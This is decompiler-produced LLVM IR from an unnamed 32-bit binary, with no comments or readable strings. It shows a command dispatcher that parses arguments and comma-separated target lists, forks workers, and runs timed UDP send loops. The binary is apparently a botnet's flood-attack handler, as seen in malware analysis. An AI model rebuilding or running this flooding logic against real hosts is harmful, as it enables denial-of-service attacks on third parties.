dec_label_pc_1000a4f0.backedge:                   ; preds = %dec_label_pc_1000a5cc, %dec_label_pc_1000a5f0
  %storemerge22 = phi i32 [ %v1_1000a5f4, %dec_label_pc_1000a5f0 ], [ 0, %dec_label_pc_1000a5cc ]
  br label %dec_label_pc_1000a4f0

dec_label_pc_1000a5f0:                            ; preds = %dec_label_pc_1000a4f0
  %v1_1000a5f4 = add i32 %stack_var_-44.0, 1
  br label %dec_label_pc_1000a4f0.backedge

dec_label_pc_1000a600:                            ; preds = %dec_label_pc_1000a5cc, %dec_label_pc_1000a118, %dec_label_pc_1000a0d8, %dec_label_pc_1000a0b4
  %v0_1000a628 = phi i32 [ %v5_1000a138, %dec_label_pc_1000a118 ], [ 0, %dec_label_pc_1000a0d8 ], [ %v4_1000a0c4, %dec_label_pc_1000a0b4 ], [ %v1_1000a5d0, %dec_label_pc_1000a5cc ]
  ret i32 %v0_1000a628

; uselistorder directives
  uselistorder i32 %v1_1000a468, { 1, 0 }
  uselistorder i32 %v3_1000a400, { 1, 0 }
  uselistorder i32* %v2_1000a250, { 1, 0, 3, 2, 5, 4, 7, 6, 9, 8, 10, 11 }
  uselistorder i32 %v1_1000a200, { 1, 0 }
  uselistorder i32 %v1_1000a1d8, { 0, 2, 1, 3 }
  uselistorder i32 %v1_1000a1b8, { 14, 15, 4, 2, 3, 5, 16, 1, 6, 17, 7, 8, 9, 10, 0, 11, 12, 13, 18, 19 }
  uselistorder i32 %v2_1000a0b4, { 1, 3, 2, 0 }
  uselistorder i32 %v1_1000a0a0, { 1, 0 }
  uselistorder i32* %stack_var_-92, { 1, 0 }
  uselistorder i32* %stack_var_-88, { 1, 0 }
  uselistorder i32* %stack_var_-76, { 1, 0 }
  uselistorder i32 (i32)* @function_1000e694, { 1, 0 }
  uselistorder i32 (i32)* @function_10008730, { 1, 0 }
  uselistorder i32 -16, { 1, 0, 2, 3 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @function_1000ed20, { 1, 0 }
  uselistorder i32 ()* @function_10000468, { 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg5, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_1000a4f0.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_1000a47c, { 1, 0 }
  uselistorder label %dec_label_pc_1000a3f4, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_1000a2f4, { 1, 0 }
  uselistorder label %dec_label_pc_1000a17c, { 1, 0 }
  uselistorder label %dec_label_pc_1000a0b4, { 1, 0 }
}

define i32 @function_1000a62c(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1000a62c:
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  store i32 268478044, i32* @lr, align 4
  %v3_1000a658 = call i32 @function_1000ed5c(i32 2, i32 2, i32 0)
  store i32 268478060, i32* @lr, align 4
  %v1_1000a668 = call i32 @function_1000c78c(i32 0)
  store i32 268478080, i32* @lr, align 4
  %v1_1000a67c = call i32 @function_1000e834(i32 %arg1)
  %v2_1000a688 = ptrtoint i32* %stack_var_-40 to i32
  store i32 0, i32* %stack_var_-40, align 4
  store i32 0, i32* %stack_var_-36, align 4
  %v1_1000a6b0 = add i32 %v1_1000a67c, 16
  %v2_1000a6b0 = inttoptr i32 %v1_1000a6b0 to i32*
  %v3_1000a6b0 = load i32, i32* %v2_1000a6b0, align 4
  %v1_1000a6b4 = inttoptr i32 %v3_1000a6b0 to i32*
  %v2_1000a6b4 = load i32, i32* %v1_1000a6b4, align 4
  %v2_1000a6bc = ptrtoint i32* %stack_var_-36 to i32
  %v1_1000a6c4 = add i32 %v1_1000a67c, 12
  %v2_1000a6c4 = inttoptr i32 %v1_1000a6c4 to i32*
  %v3_1000a6c4 = load i32, i32* %v2_1000a6c4, align 4
  store i32 %v3_1000a6c4, i32* @r5, align 4
  store i32 268478168, i32* @lr, align 4
  %v4_1000a6d4 = call i32 @function_1000e3e0(i32 %v2_1000a6b4, i32 %v2_1000a6bc, i32 %v3_1000a6c4, i32 %v1_1000a67c)
  %v1_1000a6dc = add i32 %v1_1000a67c, 8
  %v2_1000a6dc = inttoptr i32 %v1_1000a6dc to i32*
  %v3_1000a6dc = load i32, i32* %v2_1000a6dc, align 4
  %v1_1000a6e0 = urem i32 %v3_1000a6dc, 65536
  store i32 %v1_1000a6e0, i32* %stack_var_-40, align 4
  %v2_1000a748 = add i32 %v1_1000a668, %arg3
  br label %dec_label_pc_1000a6fc

dec_label_pc_1000a6fc:                            ; preds = %dec_label_pc_1000a76c, %dec_label_pc_1000a62c
  %storemerge1 = phi i32 [ 0, %dec_label_pc_1000a62c ], [ %v1_1000a770, %dec_label_pc_1000a76c ]
  %tmp17 = icmp ult i32 %storemerge1, 50
  br i1 %tmp17, label %dec_label_pc_1000a76c, label %dec_label_pc_1000a708

dec_label_pc_1000a708:                            ; preds = %dec_label_pc_1000a6fc
  store i32 268478240, i32* @lr, align 4
  %v5_1000a71c = call i32 @function_1000eca8(i32 %v3_1000a658, i32 ptrtoint ([4 x i8]* @global_var_10018d1c.630 to i32), i32 69, i32 0)
  store i32 ptrtoint ([3 x i8]* @global_var_1000a734.631 to i32), i32* @lr, align 4
  %v3_1000a730 = call i32 @function_1000ebcc(i32 %v3_1000a658, i32 %v2_1000a688, i32 16)
  store i32 268478268, i32* @lr, align 4
  %v1_1000a738 = call i32 @function_1000c78c(i32 0)
  %v2_1000a74c = icmp slt i32 %v1_1000a738, %v2_1000a748
  br i1 %v2_1000a74c, label %dec_label_pc_1000a764, label %dec_label_pc_1000a754

dec_label_pc_1000a754:                            ; preds = %dec_label_pc_1000a708
  store i32 ptrtoint ([3 x i8]* @global_var_1000a75c.632 to i32), i32* @lr, align 4
  %v1_1000a758 = call i32 @function_1000c2f4(i32 %v3_1000a658)
  %v1_1000a760 = call i32 @function_1000c228(i32 0)
  br label %dec_label_pc_1000a764

dec_label_pc_1000a764:                            ; preds = %dec_label_pc_1000a708, %dec_label_pc_1000a754
  br label %dec_label_pc_1000a76c

dec_label_pc_1000a76c:                            ; preds = %dec_label_pc_1000a6fc, %dec_label_pc_1000a764
  %stack_var_-56.0 = phi i32 [ %storemerge1, %dec_label_pc_1000a6fc ], [ 0, %dec_label_pc_1000a764 ]
  %v1_1000a770 = add i32 %stack_var_-56.0, 1
  br label %dec_label_pc_1000a6fc

; uselistorder directives
  uselistorder i32 %v3_1000a6c4, { 1, 0 }
  uselistorder i32 %v1_1000a67c, { 3, 0, 2, 1 }
  uselistorder i32* %stack_var_-36, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @function_1000e3e0, { 1, 0 }
  uselistorder i32 (i32)* @function_1000e834, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000a76c, { 1, 0 }
  uselistorder label %dec_label_pc_1000a764, { 1, 0 }
}

define i32 @function_1000a77c(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_1000a77c:
  %tmp = ptrtoint i32* %arg2 to i32
  %stack_var_-64 = alloca i32, align 4
  %v2_1000a7b0 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_10017b38.43 to i32), i32* @r4, align 4
  %v3_1000a7c0 = inttoptr i32 %v2_1000a7b0 to i8*
  %v4_1000a7c0 = call i32 @function_1000df0c(i8* %v3_1000a7c0, i32 ptrtoint ([5 x i8]* @global_var_10017b38.43 to i32))
  %v3_1000a7c8 = icmp eq i32 %v4_1000a7c0, 0
  br i1 %v3_1000a7c8, label %dec_label_pc_1000a7d0, label %dec_label_pc_1000a7f0

dec_label_pc_1000a7d0:                            ; preds = %dec_label_pc_1000a77c
  %v3_1000a7d4 = load i32, i32* @global_var_1002b8f8.42, align 4
  store i32 ptrtoint (i32* @global_var_1000a7ec.635 to i32), i32* @lr, align 4
  %v4_1000a7e8 = call i32 @function_100017e4(i32 %v3_1000a7d4, i32 ptrtoint ([6 x i8]* @global_var_10018d20.634 to i32), i32 268566528)
  br label %dec_label_pc_1000b110

dec_label_pc_1000a7f0:                            ; preds = %dec_label_pc_1000a77c
  %v2_1000a7f4 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_10018d28.636 to i32), i32* @r4, align 4
  %v3_1000a804 = inttoptr i32 %v2_1000a7f4 to i8*
  %v4_1000a804 = call i32 @function_1000df0c(i8* %v3_1000a804, i32 ptrtoint ([7 x i8]* @global_var_10018d28.636 to i32))
  %v3_1000a80c = icmp eq i32 %v4_1000a804, 0
  br i1 %v3_1000a80c, label %dec_label_pc_1000a814, label %dec_label_pc_1000a94c

dec_label_pc_1000a814:                            ; preds = %dec_label_pc_1000a7f0
  %v3_1000a818 = icmp eq i32 %arg1, 2
  br i1 %v3_1000a818, label %dec_label_pc_1000a840, label %dec_label_pc_1000a820

dec_label_pc_1000a820:                            ; preds = %dec_label_pc_1000a814
  %v3_1000a824 = load i32, i32* @global_var_1002b8f8.42, align 4
  store i32 ptrtoint (i32* @global_var_1000a83c.638 to i32), i32* @lr, align 4
  %v4_1000a838 = call i32 @function_100017e4(i32 %v3_1000a824, i32 ptrtoint ([16 x i8]* @global_var_10018d30.637 to i32), i32 268566528)
  br label %dec_label_pc_1000b110

dec_label_pc_1000a840:                            ; preds = %dec_label_pc_1000a814
  %v1_1000a844 = add i32 %tmp, 4
  %v1_1000a848 = inttoptr i32 %v1_1000a844 to i32*
  %v2_1000a848 = load i32, i32* %v1_1000a848, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_10018d40.639 to i32), i32* @r4, align 4
  %v3_1000a858 = inttoptr i32 %v2_1000a848 to i8*
  %v4_1000a858 = call i32 @function_1000df0c(i8* %v3_1000a858, i32 ptrtoint ([4 x i8]* @global_var_10018d40.639 to i32))
  %v3_1000a860 = icmp eq i32 %v4_1000a858, 0
  br i1 %v3_1000a860, label %dec_label_pc_1000a868, label %dec_label_pc_1000a8b4

dec_label_pc_1000a868:                            ; preds = %dec_label_pc_1000a840
  %v3_1000a86c = load i32, i32* @global_var_1002b928.640, align 4
  %v3_1000a870 = icmp eq i32 %v3_1000a86c, 0
  br i1 %v3_1000a870, label %dec_label_pc_1000b110, label %dec_label_pc_1000a878

dec_label_pc_1000a878:                            ; preds = %dec_label_pc_1000a868
  store i32 268478604, i32* @lr, align 4
  %v2_1000a888 = call i32 @function_1000c4dc(i32 %v3_1000a86c, i32 9)
  %v3_1000a890 = load i32, i32* @global_var_1002b8f8.42, align 4
  store i32 268478632, i32* @lr, align 4
  %v4_1000a8a4 = call i32 @function_100017e4(i32 %v3_1000a890, i32 ptrtoint ([13 x i8]* @global_var_10018d44.641 to i32), i32 268566528)
  store i32 0, i32* @global_var_1002b928.640, align 4
  br label %dec_label_pc_1000a8b4

dec_label_pc_1000a8b4:                            ; preds = %dec_label_pc_1000a840, %dec_label_pc_1000a878
  %v2_1000a8bc = load i32, i32* %v1_1000a848, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10018d54.642 to i32), i32* @r4, align 4
  %v3_1000a8cc = inttoptr i32 %v2_1000a8bc to i8*
  %v4_1000a8cc = call i32 @function_1000df0c(i8* %v3_1000a8cc, i32 ptrtoint ([3 x i8]* @global_var_10018d54.642 to i32))
  %v3_1000a8d4 = icmp eq i32 %v4_1000a8cc, 0
  br i1 %v3_1000a8d4, label %dec_label_pc_1000a8dc, label %dec_label_pc_1000a94c

dec_label_pc_1000a8dc:                            ; preds = %dec_label_pc_1000a8b4
  %v3_1000a8e0 = load i32, i32* @global_var_1002b928.640, align 4
  %v3_1000a8e4 = icmp eq i32 %v3_1000a8e0, 0
  br i1 %v3_1000a8e4, label %dec_label_pc_1000a8ec, label %dec_label_pc_1000b110

dec_label_pc_1000a8ec:                            ; preds = %dec_label_pc_1000a8dc
  store i32 268478704, i32* @lr, align 4
  %v0_1000a8ec = call i32 @function_1000c384()
  %v3_1000a8fc = icmp eq i32 %v0_1000a8ec, 0
  br i1 %v3_1000a8fc, label %dec_label_pc_1000a914, label %dec_label_pc_1000a904

dec_label_pc_1000a904:                            ; preds = %dec_label_pc_1000a8ec
  store i32 %v0_1000a8ec, i32* @global_var_1002b928.640, align 4
  br label %dec_label_pc_1000b110

dec_label_pc_1000a914:                            ; preds = %dec_label_pc_1000a8ec
  %v3_1000a928 = load i32, i32* @global_var_1002b8f8.42, align 4
  store i32 268478784, i32* @lr, align 4
  %v4_1000a93c = call i32 @function_100017e4(i32 %v3_1000a928, i32 ptrtoint ([12 x i8]* @global_var_10018d58.643 to i32), i32 268566528)
  %v1_1000a940 = call i32 @function_10008b3c(i32 %v4_1000a93c)
  %v1_1000a948 = call i32 @function_1000c228(i32 0)
  br label %dec_label_pc_1000a94c

dec_label_pc_1000a94c:                            ; preds = %dec_label_pc_1000a8b4, %dec_label_pc_1000a7f0, %dec_label_pc_1000a914
  %v2_1000a950 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_10018d64.645 to i32), i32* @r4, align 4
  %v3_1000a960 = inttoptr i32 %v2_1000a950 to i8*
  %v4_1000a960 = call i32 @function_1000df0c(i8* %v3_1000a960, i32 ptrtoint ([8 x i8]* @global_var_10018d64.645 to i32))
  %v3_1000a968 = icmp eq i32 %v4_1000a960, 0
  br i1 %v3_1000a968, label %dec_label_pc_1000a970, label %dec_label_pc_1000a9c8

dec_label_pc_1000a970:                            ; preds = %dec_label_pc_1000a94c
  store i32 268478836, i32* @lr, align 4
  %v0_1000a970 = call i32 @function_10002bfc()
  %v3_1000a978 = icmp eq i32 %v0_1000a970, 0
  br i1 %v3_1000a978, label %dec_label_pc_1000a980, label %dec_label_pc_1000a9c8

dec_label_pc_1000a980:                            ; preds = %dec_label_pc_1000a970
  %v3_1000a98c = load i32, i32* @global_var_1002b920.307, align 4
  store i32 %v3_1000a98c, i32* %stack_var_-64, align 4
  store i32 268478880, i32* @lr, align 4
  %v3_1000a99c = call i32 @function_1000e7cc(i32* nonnull %stack_var_-64, i32 ptrtoint (i32* @global_var_10030000.1 to i32))
  %v0_1000a9a4 = load i32, i32* @r29, align 4
  store i32 268478908, i32* @lr, align 4
  %v5_1000a9b8 = call i32 @function_100017e4(i32 %v0_1000a9a4, i32 ptrtoint ([13 x i8]* @global_var_10018d6c.646 to i32), i32 %v3_1000a99c)
  %v1_1000a9bc = call i32 @function_10009ce8(i32 %v5_1000a9b8)
  %v1_1000a9c4 = call i32 @function_1000c228(i32 0)
  br label %dec_label_pc_1000a9c8

dec_label_pc_1000a9c8:                            ; preds = %dec_label_pc_1000a970, %dec_label_pc_1000a94c, %dec_label_pc_1000a980
  %v2_1000a9cc = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_10018d7c.648 to i32), i32* @r4, align 4
  %v3_1000a9dc = inttoptr i32 %v2_1000a9cc to i8*
  %v4_1000a9dc = call i32 @function_1000df0c(i8* %v3_1000a9dc, i32 ptrtoint ([4 x i8]* @global_var_10018d7c.648 to i32))
  %v3_1000a9e4 = icmp eq i32 %v4_1000a9dc, 0
  br i1 %v3_1000a9e4, label %dec_label_pc_1000a9ec, label %dec_label_pc_1000ac40

dec_label_pc_1000a9ec:                            ; preds = %dec_label_pc_1000a9c8
  %tmp59 = icmp slt i32 %arg1, 6
  br i1 %tmp59, label %dec_label_pc_1000b110, label %dec_label_pc_1000a9f8

dec_label_pc_1000a9f8:                            ; preds = %dec_label_pc_1000a9ec
  %v1_1000a9fc = add i32 %tmp, 12
  %v1_1000aa00 = inttoptr i32 %v1_1000a9fc to i32*
  %v2_1000aa00 = load i32, i32* %v1_1000aa00, align 4
  store i32 268478988, i32* @lr, align 4
  %v2_1000aa08 = inttoptr i32 %v2_1000aa00 to i8*
  %v3_1000aa08 = call i32 @function_1000fa58(i8* %v2_1000aa08, i32 %v1_1000a9fc)
  %v4_1000aa14 = icmp eq i32 %v3_1000aa08, -1
  br i1 %v4_1000aa14, label %dec_label_pc_1000b110, label %dec_label_pc_1000aa1c

dec_label_pc_1000aa1c:                            ; preds = %dec_label_pc_1000a9f8
  %v1_1000aa20 = add i32 %tmp, 8
  %v1_1000aa24 = inttoptr i32 %v1_1000aa20 to i32*
  %v2_1000aa24 = load i32, i32* %v1_1000aa24, align 4
  store i32 268479024, i32* @lr, align 4
  %v2_1000aa2c = inttoptr i32 %v2_1000aa24 to i8*
  %v3_1000aa2c = call i32 @function_1000fa58(i8* %v2_1000aa2c, i32 %v1_1000aa20)
  %v4_1000aa38 = icmp eq i32 %v3_1000aa2c, -1
  br i1 %v4_1000aa38, label %dec_label_pc_1000b110, label %dec_label_pc_1000aa4c

dec_label_pc_1000aa4c:                            ; preds = %dec_label_pc_1000aa1c
  %v1_1000aa50 = add i32 %tmp, 20
  %v1_1000aa54 = inttoptr i32 %v1_1000aa50 to i32*
  %v2_1000aa54 = load i32, i32* %v1_1000aa54, align 4
  store i32 268479072, i32* @lr, align 4
  %v2_1000aa5c = inttoptr i32 %v2_1000aa54 to i8*
  %v3_1000aa5c = call i32 @function_1000fa58(i8* %v2_1000aa5c, i32 %v1_1000aa50)
  %v1_1000aa64 = icmp slt i32 %v3_1000aa5c, 0
  br i1 %v1_1000aa64, label %dec_label_pc_1000b110, label %dec_label_pc_1000aa6c

dec_label_pc_1000aa6c:                            ; preds = %dec_label_pc_1000aa4c
  %v3_1000aa70 = icmp eq i32 %arg1, 7
  br i1 %v3_1000aa70, label %dec_label_pc_1000aa78, label %dec_label_pc_1000aa9c

dec_label_pc_1000aa78:                            ; preds = %dec_label_pc_1000aa6c
  %v1_1000aa7c = add i32 %tmp, 24
  %v1_1000aa80 = inttoptr i32 %v1_1000aa7c to i32*
  %v2_1000aa80 = load i32, i32* %v1_1000aa80, align 4
  store i32 268479116, i32* @lr, align 4
  %v2_1000aa88 = inttoptr i32 %v2_1000aa80 to i8*
  %v3_1000aa88 = call i32 @function_1000fa58(i8* %v2_1000aa88, i32 %v1_1000aa7c)
  %v2_1000aa90 = icmp sgt i32 %v3_1000aa88, 0
  br i1 %v2_1000aa90, label %dec_label_pc_1000aa9c, label %dec_label_pc_1000b110

dec_label_pc_1000aa9c:                            ; preds = %dec_label_pc_1000aa6c, %dec_label_pc_1000aa78
  %v1_1000aaa0 = add i32 %tmp, 4
  %v1_1000aaa4 = inttoptr i32 %v1_1000aaa0 to i32*
  %v2_1000aaa4 = load i32, i32* %v1_1000aaa4, align 4
  %v2_1000aab4 = load i32, i32* %v1_1000aa24, align 4
  store i32 268479168, i32* @lr, align 4
  %v2_1000aabc = inttoptr i32 %v2_1000aab4 to i8*
  %v3_1000aabc = call i32 @function_1000fa58(i8* %v2_1000aabc, i32 %v1_1000aa20)
  %v2_1000aad0 = load i32, i32* %v1_1000aa00, align 4
  store i32 268479196, i32* @lr, align 4
  %v2_1000aad8 = inttoptr i32 %v2_1000aad0 to i8*
  %v3_1000aad8 = call i32 @function_1000fa58(i8* %v2_1000aad8, i32 %v1_1000a9fc)
  %v1_1000aae8 = add i32 %tmp, 16
  %v1_1000aaec = inttoptr i32 %v1_1000aae8 to i32*
  %v2_1000aaec = load i32, i32* %v1_1000aaec, align 4
  br i1 %v3_1000aa70, label %dec_label_pc_1000ab00, label %dec_label_pc_1000ab1c

dec_label_pc_1000ab00:                            ; preds = %dec_label_pc_1000aa9c
  %v1_1000ab04 = add i32 %tmp, 24
  %v1_1000ab08 = inttoptr i32 %v1_1000ab04 to i32*
  %v2_1000ab08 = load i32, i32* %v1_1000ab08, align 4
  store i32 268479252, i32* @lr, align 4
  %v2_1000ab10 = inttoptr i32 %v2_1000ab08 to i8*
  %v3_1000ab10 = call i32 @function_1000fa58(i8* %v2_1000ab10, i32 %v1_1000ab04)
  br label %dec_label_pc_1000ab5c

dec_label_pc_1000ab1c:                            ; preds = %dec_label_pc_1000aa9c
  br label %dec_label_pc_1000ab5c

dec_label_pc_1000ab5c:                            ; preds = %dec_label_pc_1000ab00, %dec_label_pc_1000ab1c
  %storemerge5 = phi i32 [ 10, %dec_label_pc_1000ab1c ], [ %v3_1000ab10, %dec_label_pc_1000ab00 ]
  %v2_1000ab40 = load i32, i32* %v1_1000aa54, align 4
  store i32 268479308, i32* @lr, align 4
  %v2_1000ab48 = inttoptr i32 %v2_1000ab40 to i8*
  %v3_1000ab48 = call i32 @function_1000fa58(i8* %v2_1000ab48, i32 %v1_1000aa50)
  store i32 %v2_1000aaa4, i32* @r3, align 4
  store i32 268479356, i32* @lr, align 4
  %v2_1000ab78 = call i32 @function_1000de0c(i32 %v2_1000aaa4, i32 44)
  %v3_1000ab80 = icmp eq i32 %v2_1000ab78, 0
  br i1 %v3_1000ab80, label %dec_label_pc_1000ac08, label %dec_label_pc_1000ab88

dec_label_pc_1000ab88:                            ; preds = %dec_label_pc_1000ab5c
  store i32 ptrtoint (i32* @global_var_10018d04.624 to i32), i32* @r4, align 4
  store i32 268479388, i32* @lr, align 4
  %v3_1000ab98 = call i32 @function_1000e454(i32 %v2_1000aaa4, i32 ptrtoint (i32* @global_var_10018d04.624 to i32), i32 268566528)
  %v3_1000abfc22 = icmp eq i32 %v3_1000ab98, 0
  br i1 %v3_1000abfc22, label %dec_label_pc_1000ac40, label %dec_label_pc_1000aba8

dec_label_pc_1000aba8:                            ; preds = %dec_label_pc_1000ab88, %dec_label_pc_1000abe0
  %storemerge1223 = phi i32 [ %v3_1000abec, %dec_label_pc_1000abe0 ], [ %v3_1000ab98, %dec_label_pc_1000ab88 ]
  store i32 268479404, i32* @lr, align 4
  %v0_1000aba8 = call i32 @function_10002bfc()
  %v3_1000abb0 = icmp eq i32 %v0_1000aba8, 0
  br i1 %v3_1000abb0, label %dec_label_pc_1000abb8, label %dec_label_pc_1000abe0

dec_label_pc_1000abb8:                            ; preds = %dec_label_pc_1000aba8
  %v7_1000abd4 = call i32 @function_1000a030(i32 %storemerge1223, i32 %v3_1000aabc, i32 %v3_1000aad8, i32 %v2_1000aaec, i32 %v3_1000ab48, i32 %storemerge5, i32 32)
  %v1_1000abdc = call i32 @function_1000c228(i32 0)
  br label %dec_label_pc_1000abe0

dec_label_pc_1000abe0:                            ; preds = %dec_label_pc_1000aba8, %dec_label_pc_1000abb8
  store i32 ptrtoint (i32* @global_var_10018d04.624 to i32), i32* @r4, align 4
  store i32 268479472, i32* @lr, align 4
  %v3_1000abec = call i32 @function_1000e454(i32 0, i32 ptrtoint (i32* @global_var_10018d04.624 to i32), i32 268566528)
  %v3_1000abfc = icmp eq i32 %v3_1000abec, 0
  br i1 %v3_1000abfc, label %dec_label_pc_1000ac40, label %dec_label_pc_1000aba8

dec_label_pc_1000ac08:                            ; preds = %dec_label_pc_1000ab5c
  store i32 268479500, i32* @lr, align 4
  %v0_1000ac08 = call i32 @function_10002bfc()
  %v3_1000ac10 = icmp eq i32 %v0_1000ac08, 0
  br i1 %v3_1000ac10, label %dec_label_pc_1000ac18, label %dec_label_pc_1000b110

dec_label_pc_1000ac18:                            ; preds = %dec_label_pc_1000ac08
  %v7_1000ac34 = call i32 @function_1000a030(i32 %v2_1000aaa4, i32 %v3_1000aabc, i32 %v3_1000aad8, i32 %v2_1000aaec, i32 %v3_1000ab48, i32 %storemerge5, i32 32)
  %v1_1000ac3c = call i32 @function_1000c228(i32 0)
  br label %dec_label_pc_1000ac40

dec_label_pc_1000ac40:                            ; preds = %dec_label_pc_1000abe0, %dec_label_pc_1000ab88, %dec_label_pc_1000a9c8, %dec_label_pc_1000ac18
  %v2_1000ac44 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_10018d80.652 to i32), i32* @r4, align 4
  %v3_1000ac54 = inttoptr i32 %v2_1000ac44 to i8*
  %v4_1000ac54 = call i32 @function_1000df0c(i8* %v3_1000ac54, i32 ptrtoint ([4 x i8]* @global_var_10018d80.652 to i32))
  %v3_1000ac5c = icmp eq i32 %v4_1000ac54, 0
  br i1 %v3_1000ac5c, label %dec_label_pc_1000ac64, label %dec_label_pc_1000adb0

dec_label_pc_1000ac64:                            ; preds = %dec_label_pc_1000ac40
  %tmp60 = icmp slt i32 %arg1, 4
  br i1 %tmp60, label %dec_label_pc_1000b110, label %dec_label_pc_1000ac70

dec_label_pc_1000ac70:                            ; preds = %dec_label_pc_1000ac64
  %v1_1000ac74 = add i32 %tmp, 8
  %v1_1000ac78 = inttoptr i32 %v1_1000ac74 to i32*
  %v2_1000ac78 = load i32, i32* %v1_1000ac78, align 4
  store i32 268479620, i32* @lr, align 4
  %v2_1000ac80 = inttoptr i32 %v2_1000ac78 to i8*
  %v3_1000ac80 = call i32 @function_1000fa58(i8* %v2_1000ac80, i32 %v1_1000ac74)
  %tmp61 = icmp slt i32 %v3_1000ac80, 1
  br i1 %tmp61, label %dec_label_pc_1000b110, label %dec_label_pc_1000ac90

dec_label_pc_1000ac90:                            ; preds = %dec_label_pc_1000ac70
  %v1_1000ac94 = add i32 %tmp, 12
  %v1_1000ac98 = inttoptr i32 %v1_1000ac94 to i32*
  %v2_1000ac98 = load i32, i32* %v1_1000ac98, align 4
  store i32 268479652, i32* @lr, align 4
  %v2_1000aca0 = inttoptr i32 %v2_1000ac98 to i8*
  %v3_1000aca0 = call i32 @function_1000fa58(i8* %v2_1000aca0, i32 %v1_1000ac94)
  %v2_1000aca8 = icmp sgt i32 %v3_1000aca0, 0
  br i1 %v2_1000aca8, label %dec_label_pc_1000acb4, label %dec_label_pc_1000b110

dec_label_pc_1000acb4:                            ; preds = %dec_label_pc_1000ac90
  %v1_1000acb8 = add i32 %tmp, 4
  %v1_1000acbc = inttoptr i32 %v1_1000acb8 to i32*
  %v2_1000acbc = load i32, i32* %v1_1000acbc, align 4
  %v2_1000accc = load i32, i32* %v1_1000ac78, align 4
  store i32 268479704, i32* @lr, align 4
  %v2_1000acd4 = inttoptr i32 %v2_1000accc to i8*
  %v3_1000acd4 = call i32 @function_1000fa58(i8* %v2_1000acd4, i32 %v1_1000ac74)
  %v2_1000ace8 = load i32, i32* %v1_1000ac98, align 4
  store i32 268479732, i32* @lr, align 4
  %v2_1000acf0 = inttoptr i32 %v2_1000ace8 to i8*
  %v3_1000acf0 = call i32 @function_1000fa58(i8* %v2_1000acf0, i32 %v1_1000ac94)
  store i32 %v2_1000acbc, i32* @r3, align 4
  store i32 268479756, i32* @lr, align 4
  %v2_1000ad08 = call i32 @function_1000de0c(i32 %v2_1000acbc, i32 44)
  %v3_1000ad10 = icmp eq i32 %v2_1000ad08, 0
  br i1 %v3_1000ad10, label %dec_label_pc_1000ad88, label %dec_label_pc_1000ad18

dec_label_pc_1000ad18:                            ; preds = %dec_label_pc_1000acb4
  store i32 ptrtoint (i32* @global_var_10018d04.624 to i32), i32* @r4, align 4
  store i32 268479788, i32* @lr, align 4
  %v3_1000ad28 = call i32 @function_1000e454(i32 %v2_1000acbc, i32 ptrtoint (i32* @global_var_10018d04.624 to i32), i32 268566528)
  %v3_1000ad7c18 = icmp eq i32 %v3_1000ad28, 0
  br i1 %v3_1000ad7c18, label %dec_label_pc_1000adb0, label %dec_label_pc_1000ad38

dec_label_pc_1000ad38:                            ; preds = %dec_label_pc_1000ad18, %dec_label_pc_1000ad60
  %storemerge1019 = phi i32 [ %v3_1000ad6c, %dec_label_pc_1000ad60 ], [ %v3_1000ad28, %dec_label_pc_1000ad18 ]
  store i32 268479804, i32* @lr, align 4
  %v0_1000ad38 = call i32 @function_10002bfc()
  %v3_1000ad40 = icmp eq i32 %v0_1000ad38, 0
  br i1 %v3_1000ad40, label %dec_label_pc_1000ad48, label %dec_label_pc_1000ad60

dec_label_pc_1000ad48:                            ; preds = %dec_label_pc_1000ad38
  %v3_1000ad54 = call i32 @function_1000a62c(i32 %storemerge1019, i32 %v3_1000acd4, i32 %v3_1000acf0)
  %v1_1000ad5c = call i32 @function_1000c228(i32 0)
  br label %dec_label_pc_1000ad60

dec_label_pc_1000ad60:                            ; preds = %dec_label_pc_1000ad38, %dec_label_pc_1000ad48
  store i32 ptrtoint (i32* @global_var_10018d04.624 to i32), i32* @r4, align 4
  store i32 268479856, i32* @lr, align 4
  %v3_1000ad6c = call i32 @function_1000e454(i32 0, i32 ptrtoint (i32* @global_var_10018d04.624 to i32), i32 268566528)
  %v3_1000ad7c = icmp eq i32 %v3_1000ad6c, 0
  br i1 %v3_1000ad7c, label %dec_label_pc_1000adb0, label %dec_label_pc_1000ad38

dec_label_pc_1000ad88:                            ; preds = %dec_label_pc_1000acb4
  store i32 268479884, i32* @lr, align 4
  %v0_1000ad88 = call i32 @function_10002bfc()
  %v3_1000ad90 = icmp eq i32 %v0_1000ad88, 0
  br i1 %v3_1000ad90, label %dec_label_pc_1000ad98, label %dec_label_pc_1000b110

dec_label_pc_1000ad98:                            ; preds = %dec_label_pc_1000ad88
  %v3_1000ada4 = call i32 @function_1000a62c(i32 %v2_1000acbc, i32 %v3_1000acd4, i32 %v3_1000acf0)
  %v1_1000adac = call i32 @function_1000c228(i32 0)
  br label %dec_label_pc_1000adb0

dec_label_pc_1000adb0:                            ; preds = %dec_label_pc_1000ad60, %dec_label_pc_1000ad18, %dec_label_pc_1000ac40, %dec_label_pc_1000ad98
  %v2_1000adb4 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_10018d84.656 to i32), i32* @r4, align 4
  %v3_1000adc4 = inttoptr i32 %v2_1000adb4 to i8*
  %v4_1000adc4 = call i32 @function_1000df0c(i8* %v3_1000adc4, i32 ptrtoint ([4 x i8]* @global_var_10018d84.656 to i32))
  %v3_1000adcc = icmp eq i32 %v4_1000adc4, 0
  br i1 %v3_1000adcc, label %dec_label_pc_1000add4, label %dec_label_pc_1000afb4

